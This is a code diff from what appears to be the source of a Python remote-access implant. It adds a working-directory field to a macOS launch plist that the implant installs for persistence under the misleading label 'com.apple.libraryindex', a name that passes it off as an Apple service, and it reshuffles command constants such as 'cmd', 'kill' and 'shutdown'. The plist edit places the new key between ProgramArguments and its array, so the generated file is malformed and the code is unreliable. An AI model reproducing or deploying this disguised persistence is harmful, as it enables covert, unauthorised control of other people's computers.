@@ -33,6 +33,7 @@ CMD = 'cmd'
 KILL_PROC = 'kill'
 HOST_TRANSFER = 'transfer'
 ASSIGN_ID = 'assign'
+SHUTDOWN = 'shutdown'
 # Special
 LS_JSON = 'ls'
 # Client -> Server
@@ -43,7 +44,6 @@ FILE_CLOSE = 'fclose'
 FILE_FILENAME = 'fname'
 CLIENT_STREAM = 'cstream'
 CLIENT_CLOSE = 'cclose'
-SHUTDOWN = 'shutdown'
 
 PRINT_BUFFER = StringIO()
 
@@ -625,6 +625,8 @@ STARTUP_PLIST = ('<?xml version="1.0" encoding="UTF-8"?>' + '\n'
                 '\t' + '<key>Label</key>' + '\n'
                 '\t' + '<string>com.apple.libraryindex</string>' + '\n'
                 '\t' + '<key>ProgramArguments</key>' + '\n'
+                '\t' + '<key>WorkingDirectory</key>' + '\n'
+                '\t' + '<string>{pwd}</string>' + '\n'
                 '\t' + '<array>' + '\n'
                 '\t\t' + '<string>{python_path}</string>' + '\n'
                 '\t\t' + '<string>{script_path}</string>' + '\n'
@@ -690,7 +692,9 @@ def install_and_run_osx(host, port):
         if not os.path.exists(daemon_loc):
             try:
                 with open(daemon_loc, "w") as f:
-                    f.write(STARTUP_PLIST.format(python_path=python_path, script_path=script_path))
+                    f.write(STARTUP_PLIST.format(python_path=python_path,
+                                                 script_path=script_path,
+                                                 pwd=os.path.dirname(script_path)))
                 break
             except:
                 pass
